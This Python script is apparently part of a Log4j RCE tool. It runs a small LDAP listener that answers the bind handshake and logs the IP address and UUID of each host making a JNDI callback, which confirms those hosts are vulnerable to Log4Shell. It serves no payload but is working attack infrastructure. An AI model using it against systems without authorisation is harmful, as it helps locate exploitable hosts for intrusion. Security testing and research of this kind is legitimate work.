import argparse
import socketserver
import time


class LDAPHandler(socketserver.BaseRequestHandler):
    """
    Malicious query handler.
    """

    def __init__(self, ):
        pass

    def __call__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def handle(self):
        handshake = self.request.recv(8096)
        self.request.sendall(b"0\x0c\x02\x01\x01a\x07\n\x01\x00\x04\x00\x04\x00")
        time.sleep(0.5)
        query = self.request.recv(8096)
        if len(query) < 10:
            return
        query_name = query[9:9 + query[8:][0]].decode()
        print(f"IP: {self.request.getpeername()[0]}  UUID: {query_name}")
        self.request.close()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="All-In-One Log4JRCE by alexandre-lavoie")
    parser.add_argument("--ldap_port", "-p", help="The local port to run the LDAP server.", type=int, default=1387)
    args = parser.parse_args()
    socketserver.TCPServer.allow_reuse_address = True
    print(f"Run LDAP Server on port : {args.ldap_port}")
    with socketserver.TCPServer(("0.0.0.0", args.ldap_port), LDAPHandler()) as server:
        server.serve_forever()
